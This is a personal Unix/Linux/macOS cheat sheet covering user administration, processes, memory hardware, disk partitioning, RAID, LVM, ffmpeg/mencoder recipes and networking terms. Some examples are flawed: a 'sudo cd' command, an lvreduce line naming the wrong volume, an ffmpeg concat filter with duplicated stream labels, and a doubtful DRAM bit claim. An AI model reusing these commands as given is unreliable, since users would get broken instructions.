================================================================================
# various Unix/Linux/Mac OS X tips by Łukasz Rajchel <lrajchel1981@gmail.com>
================================================================================

================================================================================
user administration
================================================================================
--------------------------------------------------------------------------------
# users and groups
--------------------------------------------------------------------------------
## user identifier (UID) − a unique positive integer assigned to each user
## each user is identified to the system by its UID, and user names are generally used only as an interface for humans
## UID = 0 for a root user
## UIDs 1 through 99 are traditionally reserved for special system users (pseudo-users): wheel, daemon, etc.
## group identifier (GID) − a numeric value used to represent a specific group
## each user must be a member of at least one group and can be a member of multiple groups
## primary group − a default group used when a user creates a new file or logs in
## the primary group's name is usually the same as the user name
## secondary (supplementary) group − a group to which a user belongs which is not a primary group
## "/etc/passwd": UIDs are in the 3rd field, and GIDs are in the 4th field
## "/etc/group": list of the groups in the system
## "/etc/login.defs": minimum UID for newly created regular users (usually UID_MIN = 1000) etc.
--------------------------------------------------------------------------------

# list all users in the system:
getent passwd
# or:
compgen -u

# list all users who can log in:
grep -v nologin /etc/passwd

# list all groups in the system:
compgen -g

# list all groups and their members in the system:
getent group

# list all users in the "wheel" group:
getent group wheel

# print user and group information for the current user:
id

# print the groups a user is in:
groups theochem

# add the user to the supplementary group:
sudo usermod -aG gaussian theochem

# change a default user shell:
chsh -s /bin/bash

================================================================================
processes
================================================================================
--------------------------------------------------------------------------------
# processes and signals
--------------------------------------------------------------------------------
## process − a collection of threads
## thread identifier (TID) − a number uniquely identifying a thread
## process identifier (PID) − a number uniquely identifying a process
## an ordinary process has a single thread with TID = PID
## child process − a process created by another process (the parent process)
## parent process − a process that has created one or more child processes
## parent process identifier (PPID) − PID of the parent of a process
## process group − a collection of one or more processes
## process group identifier (PGID) − a number uniquely identifying a process group
## process group leader − a process for which PID = PGID
## a child process inherits a process group from its parent process
## session − a collection of process groups, usually set up by a login process
## session identifier (SID) − a number uniquely identifying a session
## session leader − a process for which PID = SID
--------------------------------------------------------------------------------
## teletype (TTY) − a text terminal to interact with a host
## controlling TTY (CTTY) − a terminal on which one is logged in
## the processes which are descendants of the CTTY are usually members of the same session
## current terminal PGID − a PGID of a controlling TTY
## synchronous command execution: you wait for a command to finish before moving on to another task
### real-life example: you're in a queue to get a movie ticket − you cannot get one until everybody in front of you gets one
## asynchronous command execution: you can move on to another task before a command finishes
### real-life example: you order your food in a restaurant, while other people can also order their food and neither you nor they have to wait for other people's food to be cooked before they can make orders − the workers are continuously cooking, serving, and taking orders and people get their food as soon as it is cooked
--------------------------------------------------------------------------------
## signal − an asynchronous notification sent to a process or a thread in order to notify it of an event that occurred
## signal examples:
------------------------------------------------------------
### signal   action comment                  TTY shortcut
------------------------------------------------------------
### SIGINT   Term   interrupt from keyboard  <CTRL>+"c"
### SIGTSTP  Stop   stop typed at terminal   <CTRL>+"z"
### SIGTERM  Term   termination signal
### SIGKILL  Term   kill signal
### SIGSEGV  Core   invalid memory reference
### SIGCONT  Cont   continue if stopped
------------------------------------------------------------
### Term − terminate the process
### Core − terminate the process and dump core
### Stop − suspend the process
### Cont − continue the process if it is currently suspended
### the TERM signal kills processes that do not catch it
### the KILL signal kills all the processes
------------------------------------------------------------
## foreground process − a member of a current terminal process group
## background process − a process outside a current terminal process group (though usually still a member of a CTTY session)
## foreground process receives keyboard-generated TTY signals
## background process is immune to keyboard-generated TTY signals
## at most one process group can be in the foreground of the session
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# BASH job control
--------------------------------------------------------------------------------
## job − one or more processes started with a pipeline
## current job − a job stopped (suspended) while it was in the foreground or started in the background
## job specification:
### "%%" or "%+" − a current job
### "%-" − a previous job
## special parameters related to the job control:
### "$$" − a PID of the shell
### "$0" − the name of the shell or shell script
### "$!" − a PID corresponding to the current job

## start a job asynchronously (in the background):
molpro H2O.inp &
------------------------------------------------------------
output
------------------------------------------------------------
[1] 28055
------------------------------------------------------------
# where:
## 1 − job number
## 28055 − PID of the last process in the pipeline associated with job number 1

## list the active jobs:
jobs

## suspend a job started synchronously (in the foreground) and move it to the background:
<CTRL>+"z"
## and
bg %+
## or:
%+ &
## or simply:
bg

## move a current job to the foreground:
fg %+
## or:
%+
## or simply:
fg

## move a job number 2 to the foreground:
fg %2
## or:
%2
--------------------------------------------------------------------------------

# print the pathname of the CTTY:
tty

# show jobs' PIDs, PGIDs, SIDs and CTTYs ("?" in the TTY field means job has no CTTY):
ps aux -j

# check system resources interactively:
htop
# press "t" to display a tree of processes, or:
pstree

# show only the processes of a given user:
htop -u luke
# or:
pgrep -au luke

# simulate top with ps, sort by memory:
ps aux --sort -rss | more

# show child processes of a parent process with a PID of 1653:
pgrep -aP 1653

# send a TERM signal (SIGTERM) to all processes in the current process group:
kill 0

# send a KILL signal (SIGKILL) to a processes group with a given PGID:
kill -KILL -1200
# or:
kill -9 -1200
# "-9" means signal number 9 (a KILL signal)

# send a KILL signal (SIGKILL) to a processes with a given PID:
kill -9 1200

# kill the process group to which the "molpro" process belongs:
killall -9 -g molpro

--------------------------------------------------------------------------------
# process permissions
--------------------------------------------------------------------------------
## every process has two UIDs associated with it:
### real UID (RUID) − UID of the user who launched the process
### effective UID (EUID) − UID seen by an operating system to determine what resources the process can access
## usually RUID = EUID
## every process also has GIDs associated with it:
### real GID (RGID) − GID of the primary group of the user who launched the process
### effective GID (EGID) is analogous to EUID
### a set of supplementary GIDs
## the persona of the process − the EUID, EGID and supplementary GIDs of the process
## note that the PID and the persona of the process are different things: a single user can create many processes which share the same EUID and EGID, but which differ in PIDs

## a login shell starts with a persona consisting of:
### the UID of the user
### the GID of the user's primary group
### the GIDs of the user's secondary groups
## a child process normally inherits persona from its parent process

## set UID upon execution (setuid, SUID) / set GID upon execution (setgid, SGID) − access rights flags that allow users to run an executable with the permissions of the executable's owner / group, respectively
## if a program with a setuid flag set is executed, its EUID = UID of the program file owner
## thus a normal user running a setuid-set executable file gains the privileges of the owner of the file (commonly root) within the created process
## if a program with a setgid flag set is executed, its EGID = GID of the program file group
## thus a normal user running a setgid-set executable file gains the privileges of the group of the file within the created process
--------------------------------------------------------------------------------

# print PIDs, UIDs and GIDs of the processes:
ps -eo pid,user,ruid,euid,rgid,egid,comm

================================================================================
memory
================================================================================
--------------------------------------------------------------------------------
# hardware
--------------------------------------------------------------------------------
## clock speed = clock frequency = clock rate (ν) − number of clock cycles per unit of time
## clock cycle (τ) − the amount of time between two cycles:
### τ = 1 / ν
### e.g. ν = 1000 MHz ⇒ τ = 1 ns
## (memory) transfer rate (νtr) − number of transfers per unit of time:
### νtr = ntr * ν
### ntr − number of transfers per clock cycle

## (memory) bandwidth (μtr) − amount of memory transferred per unit of time
## (computer) bus − a communication system that transfers data between components inside a computer or between computers
## bus width (bw) − maximum amount of information which can be contained in a single transfer carried over the bus
## buses are usually 32-bit (bw = 4 B) and 64-bit (bw = 8 B)

## μtr = bw * νtr = ntr * bw * ν
## [ν] = [νtr] = 1/s = Hz
## [bw] = B
## [μtr] = B/s

## non-volatile memory (NVM) − a type of computer memory that can retain information even after being power cycled (turned off and back on)
## volatile memory (VM) − a type of computer memory that needs constant power in order to prevent data from being erased

## random-access memory (RAM) − a form of computer data storage that stores data and machine code currently being used
## trw − time required to read and write data:
### for a RAM device, trw is almost the same irrespective of the physical location of the data inside the memory device
### for data storage media such as hard disks and CDs, trw depends significantly on the physical location of the data inside the medium, due to mechanical limitations (e.g. media rotation speeds)

## dynamic RAM (DRAM) − a type of volatile semiconductor memory that needs to be be periodically refreshed
## DRAM stores each bit of data in a separate tiny capacitor within an integrated circuit
## the capacitor in DRAM can either be charged (bit 0) or discharged (bit 1)
## the electric charge on the DRAM capacitors slowly leaks off, so without intervention the data on the chip is soon lost
## to prevent information loss, DRAM requires an external memory refresh circuit which periodically rewrites the data in the capacitors, restoring them to their original charge, and that's why it's called dynamic

## static RAM (SRAM) − a type of volatile semiconductor memory that doesn't need to be be periodically refreshed
## SRAM is faster and more expensive than DRAM
## SRAM is used for CPU cache
## SRAM does not need continuous electrical refreshes to keep its contents (it's not dynamic), but it still requires constant current to sustain the difference in voltage not too loose the contents (it's volatile)

## synchronous DRAM (SDRAM) − DRAM in which the operation of its external pin interface is coordinated by an externally supplied clock signal

## dual in-line memory module (DIMM) − a series of DRAM integrated circuits, mounted on a printed circuit board
## small outline DIMM (SO-DIMM) − a smaller alternative to a DIMM, roughly half the size of a regular DIMM, used in laptops, notebooks, etc.
## DIMMs are inserted into DIMM slots which must correspond to the number of pins and notches on the DIMM insertable edge (e.g. a 204-pin SO-DIMM with a single notch)

## single data rate SDRAM (SDR SDRAM) − SDRAM that can accept one command and transfer one word of data per clock cycle
## double data rate SDRAM (DDR SDRAM) − SDRAM that uses double pumping (transferring data on both the rising and falling edges of the clock signal) to double data bus bandwidth without a corresponding increase in clock frequency
## there are several generations of DDR SDRAM (DDRngen SDRAM, ngen = 1, 2, 3, 4, ...)

## ν(SDRAM) − SDRAM's clock frequency
## if ν(DDR SDRAM) = ν(SDR SDRAM), νtr(DDR SDRAM) ≈ 2 * νtr(SDR SDRAM) due to the double pumping
## νtr is given as DDRngen-(νtr / MHz), and (ntr = 2, νtr = 2 * ν, τ = 2 / νtr) for DDR SDRAM
### e.g. for DDR3-2000, νtr = 2000 MHz, ν = 1000 MHz and τ = 1 ns
## μtr is given as PCngen-μtr/(MB/s)
### e.g. for 64-bit bus and DDR4-2400, μtr = 8 B * 2400 MHz = 19200 MB/s = 19.2 GB/s, so it's PC4-19200

## memory timings = RAM timings describe the performance of SDRAM using usually four parameters in units of clock cycles (τ) separated with dashes that specify the latencies (time delays) affecting RAM speed: lower numbers mean faster performance
## absolute system performance is measured by τAL (actual latency):
### τAL = nCL * τ = 2 * nCL / νtr
### nCL − the first number in memory timings list (column access strobe latency number), e.g. given as CL7 (nCL = 7)
### e.g. for DDR3-2000 7-8-8-24, τ = 1 ns and τAL = 7 * τ = 7 ns
### e.g. for DDR3-2666 9-8-8-24, τ ≈ 0.75 ns and τAL = 9 * τ ≈ 6.75 ns
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# kernel parameters
--------------------------------------------------------------------------------
## SHMMAX − maximum size of a single shared memory segment in bytes
## SHMALL − total size of shared memory segments system wide in pages
## ceil(SHMMAX / PAGE_SIZE) <= SHMALL < TM / PAGE_SIZE
### TM − total physical memory on the system in bytes
### e.g. SHMALL = ceil(alpha * TM / PAGE_SIZE), alpha = 0.9
--------------------------------------------------------------------------------

# get the memory page size in bytes:
getconf PAGE_SIZE

# check the system SHMMAX:
sysctl -a | grep shmmax

# dynamically change SHMMAX:
sysctl -w kernel.shmmax=2147483648

# permanently change SHMMAX: in "/etc/sysctl.conf" edit the line:
kernel.shmmax = 2147483648
# SHMALL can be adjusted in the same way (kernel.shmall)

# get shared memory info:
ipcs -lm
------------------------------------------------------------
output
------------------------------------------------------------
------ Shared Memory Limits --------
max number of segments = 4096
max seg size (kbytes) = 131072
max total shared memory (kbytes) = 8388608
min seg size (bytes) = 1
------------------------------------------------------------
# where:
## 131072 = SHMMAX / 2¹⁰
## 8388608 = SHMALL * PAGE_SIZE / 2¹⁰

================================================================================
locale / regional settings
================================================================================
# locale − a set of parameters that defines the user's language, region, etc.

# show current settings of the system locale and keyboard mapping:
locale
# or:
localectl status

================================================================================
man / info
================================================================================
# look for a specific string within an info page:
info make | grep -i fflags

================================================================================
Bugzilla
================================================================================
# strings that are automatically linkified in the comments:
bug 12345
comment 7
bug 23456, comment 53
attachment 4321

================================================================================
disk partitioning and checking
================================================================================
--------------------------------------------------------------------------------
# hardware
--------------------------------------------------------------------------------
## hard disk drive (HDD) − a non-volatile storage device using one or more rapidly rotating rigid disks (platters) coated with magnetic material to store and retrieve digital information
## solid-state storage (SSS) − a type of non-volatile storage using only electronic circuits, without any involvement of moving mechanical parts, to store and retrieve digital information
## solid-state drive (SSD) − a SSS-based device

## disk track − annulus (a region between R₁ and R₂ radii, R₁ < R₂) on the surface of a HDD on which data is magnetically recorded and from which it's read
## disk track is thus a physical division of data in a HDD
## disk sector − a smallest unit of a HDD, a subdivision of a disk track holding a fixed amount of user-accessible data
## page − a smallest unit of a SSD, composed of several memory cells

## block − a sequence of bytes or bits, usually containing some whole number of records
## for HDD, blocks are an abstraction over disk sectors possibly encompassing multiple sectors
## for SSD, blocks are an abstraction over pages possibly encompassing multiple pages
## block size − a maximum length of a block (e.g. 512 B)

## filesystem − a method to control how data is stored and retrieved

## get the disk sector size:
sudo fdisk -l /dev/sda | grep "Sector size"

## get the disk block size:
sudo blockdev --getbsz /dev/sda
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# disk formatting proceeds in three stages:
--------------------------------------------------------------------------------
## low-level formatting − basic medium preparation
## disk partitioning − creation of one or more regions (partitions) so that an operating system can manage information in each region separately
## high-level formatting − generating a new filesystem on a partition (a partition with a filesystem is often referred to simply as a filesystem by most Linux commands)
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# create a FAT32 and ext4 filesystems on an external USB disk:
--------------------------------------------------------------------------------
## create a GPT (a modern partition table) and partitions with gdisk using options:
### o (new GPT)
### n (new partition)
### and follow instructions to create the two partitions

## create filesystems checking the partitions for bad blocks beforehand:
sudo mkfs.vfat -c -F 32 -n Share /dev/sdc1
sudo mkfs.ext4 -cc -m 0 -L Data /dev/sdc2
--------------------------------------------------------------------------------

# force the kernel to re-read the partition table without rebooting (e.g., after using gdisk):
sudo partprobe

# get info on a filesystem:
sudo tune2fs -l /dev/sdb1

# free reserved space on a partition and change its label (this won't destroy the data):
sudo tune2fs -m 0 -L ŁR_Seagate /dev/sdb1

# check and repair a filesystem including a non-destructive read-write bad blocks test:
sudo umount /dev/sdb1
sudo fsck -vcck /dev/sdb1

# check if a directory is a mountpoint:
usb_disk=~/my_disk
mountpoint -q "$usb_disk" && echo "$usb_disk is a mountpoint"

--------------------------------------------------------------------------------
# redundant array of independent disks (RAID)
--------------------------------------------------------------------------------
## create RAID0 (striping, for faster I/O operations) using two identical disks − e.g. "/dev/sdb" and "/dev/sdc":

### create RAID partitions on the two devices − e.g. for "/dev/sdb":
sudo fdisk /dev/sdb
### enter "n", "p", "1", "t", "fd" − to set the partition type to "RAID autodetect"

### create a RAID device:
sudo mdadm --create /dev/md0 -n 2 -l raid0 /dev/sd{b,c}1

### create a filesystem on a RAID device:
sudo mkfs.ext4 -m 0 -L Data /dev/md0

### add the info to the config file:
sudo mdadm --detail --scan >> /etc/mdadm.conf

### mount the RAID partition − e.g. add the appropriate line to "/etc/fstab":
/dev/md0	/scratch	ext4	defaults	1	2
### and then
sudo mount -a

## get info on a RAID device:
sudo mdadm -D /dev/md0

## test RAID array speed:
sudo cd /scratch && sudo dd if=/dev/zero of=output bs=8k count=256k && rm output
## we assume "/scratch" is on a RAID device
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# logical volume management (LVM)
--------------------------------------------------------------------------------
## create "data" volume group using "/dev/sda4" and "/dev/sdb2" partitions, and then create "data_a" and "data_b" logical volumes with ext4 filesystems:

### create "/dev/sda4" and "/dev/sdb2" partitions marked as "Linux LVM", e.g. with gdisk

### create "data_a" and "data_b" logical volumes:
sudo pvcreate /dev/sda4 /dev/sdb2
sudo vgcreate data /dev/sda4 /dev/sdb2
sudo lvcreate -L 200G -n data_a data
sudo lvcreate -l 100%FREE -n data_b data
### (logical volumes are called "/dev/data/data_a" or "/dev/mapper/data-data_a", which are symbolic links to "/dev/dm-n" files)

### create filesystems:
sudo mkfs.ext4 -m 0 -L Data_a /dev/data/data_a
sudo mkfs.ext4 -m 0 -L Data_b /dev/data/data_b

### mount the logical volumes:
sudo mount /dev/data/data_a /mnt/data_a
sudo mount /dev/data/data_b /mnt/data_b

### logical volumes can be mounted automatically by adding appropriate lines to "/etc/fstab":
/dev/mapper/data-data_a	/mnt/data_a	ext4	defaults	1	2
/dev/mapper/data-data_b	/mnt/data_b	ext4	defaults	1	2
### and then
sudo mount -a

### activate/deactivate "data" volume group (deactivation is necessary before unplugging external LVM drive containing already unmounted logical volumes to avoid I/O errors):
sudo vgchange -ay data # activation
sudo vgchange -an data # deactivation

## extend a "home" logical volume mounted in "/home" so that it takes up all the free space remaining on its volume group, "vg":
sudo umount /home
sudo lvextend -l +100%FREE -r /dev/vg/home
sudo mount /home

## reduce a "home" logical volume mounted in "/home" contained in a "vg" volume group to 10 GiB:
sudo umount /home
sudo lvreduce -L 10G -r /dev/vg_mcb/scratch
mount /home
--------------------------------------------------------------------------------

# try to restore the damaged disk, e.g. CD-ROM:
ddrescue -n -b 2048 /dev/cdrom cdimage.img cdlog
ddrescue -d -b 2048 /dev/cdrom cdimage.img cdlog

# measure disk speed:
sudo hdparm -tT /dev/sdd1

# get partition UUID:
sudo blkid /dev/sdc1

================================================================================
espeak
================================================================================
# list avaialble voices:
espeak --voices

# write phonemes for French:
espeak -v fr-fr --ipa

================================================================================
ffmpeg / mencoder / video tools
================================================================================
# sampling − reduction of a continuous-time signal to a discrete-time signal
# audio sampling rate (af) is typically 48 kHz
# video frame rate (vf) is typically 25 Hz = 25 fps (frames per second)
# note that af >> vf

--------------------------------------------------------------------------------
# bitrate units:
--------------------------------------------------------------------------------
## kbps = kb/s = kbit/s = 1000 b/s = kilobit per second

## kBps = kB/s = 1000 B/s = 8000 b/s = kilobyte per second

## KiBps = KiB/s = 2¹⁰ B/s = 1024 B/s = 8192 b/s = kibibyte per second

## midentify outputs ID_VIDEO_BITRATE and (usually two) ID_AUDIO_BITRATE fields in bit/s (the first ID_AUDIO_BITRATE field is part of video stream, the second one refers to the proper audio stream)

## ffprobe outputs the audio bitrate in kbit/s and the total bitrate in bit/s calculated as (file size) / (stream duration), which is a rough estimate of the total video and audio bitrates

## tcprobe outputs the audio bitrate in kbit/s

# get the video/audio bitrate:
midentify in.avi
ffprobe -show_format -unit in.avi
tcprobe -i in.avi
--------------------------------------------------------------------------------

# get the number of frames in a video stream:
ffprobe -v error -count_frames -select_streams v:0 -show_entries stream=nb_read_frames -of default=nokey=1:noprint_wrappers=1 in.avi

# show exact timestamps of video frames:
mpv --osd-fractions in.avi

--------------------------------------------------------------------------------
# ffmpeg
--------------------------------------------------------------------------------
## 0-based indices number input files (each specified with "-i" option) and streams, e.g. "2:3" is the fourth stream in the third input file

## options are applied to the next specified file (either input or output)

## "-codec:str" or "-c:str" selects encoder (before output) or decoder (before input), "str" selects stream
### "a:0" − the first audio
### "v" − video

## "-map fil:str | label" selects input stream "str" from a file "fil" or the one defined with "label", e.g.
ffmpeg -i a.avi -i b.avi -c copy -map 0:v -map 1:a:2 out.avi
## copies the video stream from "a.avi" and the third audio stream from "b.avi" into "out.avi"

## "-filter[:str] filtergraph" applies filtergraph to the "str" stream

## the exact frame range may be extracted from a video with the "trim" and "setpts" filters (so that the time of the first frame is zero), but note that:
ffmpeg -i in.mkv -vf trim=start_frame=1000:end_frame=1200,setpts=PTS-STARTPTS out.mkv
## trims only the video stream, the audio is untouched, therefore the output is a bizzarre clip with video stopping at the last frame and audio still on, so we need to either disable the audio stream:
ffmpeg -i in.mkv -vf trim=start_frame=1000:end_frame=1200,setpts=PTS-STARTPTS -an out.mkv
## or trim the audio stream accordingly, thus we need to compute the time range from frames [time = (frame_number - 1) / frame_rate)]:
ffmpeg -i in.mkv -vf trim=start_frame=1000:end_frame=1200,setpts=PTS-STARTPTS -af "atrim=start=39.96:end=47.96,asetpts=PTS-STARTPTS" out.mkv
## of course we can put the time range to both filters:
ffmpeg -i in.mkv -vf "trim=start=39.96:end=47.96,setpts=PTS-STARTPTS" -af "atrim=start=39.96:end=47.96,asetpts=PTS-STARTPTS" out.mkv

## note we double quote the filtergraphs containing dots (".") to prevent their shell expansion

## "-filter_complex filtergraph" applies complex filtergraph (one with arbitrary number of inputs and outputs), e.g.
ffmpeg -i video.mkv -i image.png -filter_complex "[0:v][1:v]overlay[out]" -map "[out]" out.mkv
## overlays an image ("1:v") over video ("0:v") − the are both inputs to the overlay filter, and there's only one output (labeled "[out]"), assuming there's only one video stream in input files, this is equivalent to
ffmpeg -i video.mkv -i image.png -filter_complex overlay out.mkv

## note that "-map [out]" (unquoted "[out]") would e.g. expand to "-map o" if there were a file "o" in the current directory, as "[...]" matches any one of the enclosed characters and within double quotes "[" and "]" lose their special meaning

## extract video segments between 10 s and 20 s and between 50 s and 60 s with the "concat" filter, mapping only the video stream (no audio):
ffmpeg -i in.avi -lavfi \
	"[0:v]trim=10:20,setpts=PTS-STARTPTS[v1]; \
	 [0:v]trim=50:60,setpts=PTS-STARTPTS[v2]; \
	 [v1][v2]concat[out]" \
	-map "[out]" out.mkv

## extract video segments between 10 s and 20 s, between 50 s and 60 s, and between 120 s and 130 s with the "concat" filter, mapping both video and audio streams (after adding more streams, adjust "n")
t1=10
t2=20
t3=50
t4=60
t5=120
t6=130
ffmpeg -i in.avi -lavfi \
	"[0:v]trim=$t1:$t2,setpts=PTS-STARTPTS[v1]; \
	 [0:a]atrim=$t1:$t2,asetpts=PTS-STARTPTS[a1]; \
	 [0:v]trim=$t3:$t4,setpts=PTS-STARTPTS[v2]; \
	 [0:a]atrim=$t3:$t4,asetpts=PTS-STARTPTS[a2]; \
	 [0:v]trim=$t5:$t6,setpts=PTS-STARTPTS[v2]; \
	 [0:a]atrim=$t5:$t6,asetpts=PTS-STARTPTS[a2]; \
	 [v1][a1][v2][a2][v3][a3]concat=n=3:v=1:a=1[outv][outa]" \
	-map "[outv]" -map "[outa]" out.mkv

## "-c:v" = "-vcodec", similarly for "-acodec"
## "-filter:v" = "-vf", similarly for "-af"
## "-lavfi" = "-filter_complex"

## delete the first 30 s from mp3 file:
ffmpeg -i in.mp3 -c:a copy -ss 30 out.mp3

## extract and scale a movie fragment between two frames into an animated GIF:
frame_start=1000
frame_end=2000
width=400
fops="trim=start_frame=$frame_start:end_frame=$frame_end,fps=15,scale=$width:-1:flags=lanczos"
ffmpeg -i in.avi -vf "$fops,palettegen" pal.png
ffmpeg -i in.avi -i pal.png -lavfi "$fops[x];[x][1:v]paletteuse" out.gif

## extract and scale a movie fragment and hardcopy subtitles into it:
seek_time=05:30
duration=60
subfile_in=in.srt
subfile_out=$(mktemp).${subfile_in##*.}
ffmpeg -i "$subfile_in" -ss "$seek_time" -t "$duration" "$subfile_out"
ffmpeg -ss "$seek_time" -t "$duration" -i in.avi -b:v 800k -vf "scale=600:-1,subtitles=$subfile_out:force_style='Fontsize=30'" out.avi
rm -f "$subfile_out"
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# mencoder
--------------------------------------------------------------------------------
## in case of A/V sync issues with mencoder, try adding "-mc 0 -noskip" option

## transcode the clip into avi format using:
### mpeg4 video codec with video bitrate of 800 kbps
### mp3 audio codec with audio bitrate of 128 kbps
mencoder -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=800:autoaspect -oac mp3lame -lameopts abr:br=128 in.flv -o out.avi
## the same thing in ffmpeg:
ffmpeg -i in.flv -c:v mpeg4 -b:v 800k -c:a libmp3lame -b:a 128k out.avi
## in two above examples the parts "vcodec=mpeg4:" and "-vcodec mpeg4" can be skipped as they are default options

## transcode the clip into avi as above, and resize it to 800 × YYY pixels (maintaining aspect ratio):
mencoder -vf scale -zoom -xy 800 -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=800:autoaspect -oac mp3lame -lameopts abr:br=128 in.flv -o out.avi

## extract a 2 min fragment from a film starting at 1:28:20 with transcoding:
mencoder -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=800:vhq -oac mp3lame -lameopts abr:br=64 -ss 1:28:20 -endpos 2:00 in.avi -o out.avi

## extract a 2 min fragment from a film starting at 1:28:20, resize it maintaining the aspect ratio
## hardcopy the subtitles in cp-1250 encoding (strangely, you have to use -subcp iso-8859-1 for this)
## assure the subtitles take up 80 % screen width at most:
mencoder in.avi -o out.avi -mc 0 -noskip -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=800:vhq -vf scale -zoom -xy 400 -oac copy -sub in.txt -subcp iso-8859-1 -subwidth 80 -ss 1:28:20 -endpos 2:00

## join videos with same resolution into one avi file (check input bitrates to choose a reasonable output value):
mencoder -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=800:vhq -oac mp3lame -lameopts abr:br=64 file*.mp4 -o out.avi

## join videos with different resolutions into one avi file (check the input video resolutions to choose a reasonable output value):
mencoder -vf scale -zoom -xy 640 -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=1800:mbd=2:autoaspect -oac mp3lame -lameopts abr:br=64 file1.mkv file2.mp4 -o out.avi

## extract a 1 min movie fragment starting from 1:00:00 into an animated GIF (the resulting GIF is worse in quality than ffmpeg-created one, see above):
mplayer -ss 1:00:00 -endpos 2:00 in.avi -vo gif89a:fps=15:output=out.gif

## one-liner DVD ripper: the DVD has been copied to a pendrive (/Volumes/KINGSTON) to Movie directory:
mencoder dvd:// -dvd-device /Volumes/KINGSTON/Movie -ovc lavc -lavcopts vcodec=mpeg4:vhq:vbitrate=1200:autoaspect=1 -vf scale -zoom -xy 640 -oac mp3lame -lameopts br=128 -o Movie.avi

## two-pass DVD ripper for better quality:

### get the crop values for the DVD which starts, say, at chapter 2 (but make sure you properly choose them − the parameters may be shown incorrectly when there is a dark background, so better choose a part of a film with a bright background so that the black rectangle stands out):
mplayer dvd://2 -vf cropdetect -ss 20:00

### use the output from the above command for the crop values (-vf crop=720:432:0:72 − from the previous command) and encode with English; make the 1st pass:
mencoder dvd://2 -alang en -ovc lavc -lavcopts vcodec=mpeg4:vhq:vbitrate=1200:autoaspect=1:vpass=1 -vf crop=720:432:0:72 -oac copy -o /dev/null

### finally, make the 2nd pass:
mencoder dvd://2 -alang en -ovc lavc -lavcopts vcodec=mpeg4:vhq:vbitrate=1200:autoaspect=1:vpass=2 -vf crop=720:432:0:72 -oac mp3lame -lameopts br=128 -o Film.avi

## extract the English subtitles from DVD:
mencoder dvd://2 -nosound -ovc frameno -o /dev/null -slang en -vobsubout Film

## compress the video with mencoder limiting the output file size to 700 MB:
mencoder in.avi -ovc xvid -xvidencopts bitrate=-700000 -oac mp3lame -o out.avi

## combine image files (of the same size!) into a single movie file with music background:
mencoder -audiofile "music.mp3" -ovc lavc -lavcopts vcodec=mpeg4 -oac copy "mf://*.jpg" -mf fps=0.3 -o output.avi
--------------------------------------------------------------------------------

================================================================================
external storage (phones etc.)
================================================================================
# Digital Camera Images (DCIM) − directory with pictures

# mount/unmount Android phone connected via an USB cable in the "~/my-phone" directory:
simple-mtpfs ~/my-phone
fusermount -u ~/my-phone

# mount DVD created under Mac OS X so that long file names are displayed properly:
sudo mount -o norock,map=o,utf8 /dev/cdrom /media/cdrom

================================================================================
grep
================================================================================
# case-insensitively search for files with the "mod.*ule" pattern within directories ending with "jobs" in the current directory and their subdirectories, omitting binary files:
grep -irI "mod.*ule" *jobs

================================================================================
logs with systemd
================================================================================
# view most recent system logs in a live mode:
journalctl -f

# view system logs since last boot in reverse order:
journalctl -b -r

# view system logs since last boot for chronyd service:
journalctl -b _SYSTEMD_UNIT=chronyd.service

# view most recent system logs for Kontact and Akonadi:
journalctl -n /usr/bin/kontact /usr/bin/akonadi*
# use "-n 50" to see 50 most recent messages, default is 10

================================================================================
MacPorts
================================================================================
# free some disk space:
sudo port uninstall inactive
sudo port clean --all inactive
sudo port clean --all installed

================================================================================
make
================================================================================
# avoid using "-j" option with non-compiling targets ("install" is usually such a target): instead of
make -j all install
# use
make -j all
make install

================================================================================
Maxima
================================================================================
# print a number using scientific notation:
printf(false, "~e", alpha);

================================================================================
MolMol
================================================================================
# measure distances and bond angles in MolMol:
type "DialMeasure on" in command line and select two or three atoms (first with mouse, others with <SHIFT> + mouse)

================================================================================
network
================================================================================
--------------------------------------------------------------------------------
# basic networking terms:
--------------------------------------------------------------------------------
## communication protocol − a set of rules allowing two or more parts of a communications system to transmit information via some physical quantity
## internet protocol (IP), transmission control protocol (TCP) − principal communication protocols for relaying data across network
## TCP/IP = Department of Defense (DoD) model − a complete Internet protocol suite specifying how data should be packetized, addressed, transmitted, routed and received
## IP address − a numerical label assigned to each device connected to a computer network that uses the IP for communication
## packet − the unit of data routed between an origin and a destination on the network
### TCP layer of the TCP/IP divides data sent over the network (emails, files, etc.) into chunks (packets) of an efficient size for routing
### each packet is numbered and includes the IP address of the origin and the destination
### upon arriving at their destination, packets are reassembled into the original file by the destination's TCP layer
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# useful wireless networking terms:
--------------------------------------------------------------------------------
## WiFi − a technology for wireless networking
## wireless local area network (WLAN) − a wireless computer network connecting two or more devices using a WiFi
## 802.11 − a set of specifications for implementing WLAN computer communication, e.g. it introduces 14 channels differing in radio frequency
## wireless access point (AP, WAP) − a device allowing a WiFi-equipped device to connect to a wired network, it can either connect to a router or be a part of a router
## wireless network interface controller/adapter (WNIC) − a network interface controller which connects to WLAN
## hotspot − a physical location where people may obtain Internet access using WiFi via WLAN
## media access control address (MAC address) − a unique identifier assigned to network interfaces
## basic service set (BSS) − a single AP together with all associated stations
## BSS identifier (BSSID) − a unique identifier of a BSS, usually its MAC address
## service set identifier (SSID) − a WLAN identifier which serves as a login when connecting to AP, it's the informal (human) name of the service set
## extended service set (ESS) − a set of two or more interconnected wireless BSSs that share the same SSID (ESSID in this context)
## so you go to a hotspot where you connect to an access point using WiFi:
### WiFi = the how
### access point = the what
### hotspot = the where
## signal strength in decibel-milliwatts:
### s / dBm = 10 log(P / P₀), P₀ = 1 mW, so for P < P₀, s < 0
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# WLAN configurations (topologies):
--------------------------------------------------------------------------------
## wireless ad hoc network (WANET, peer-to-peer network) − data is transferred to and from wireless network adapters connected to PCs and other devices such as printers, so the devices communicate directly, not through a router
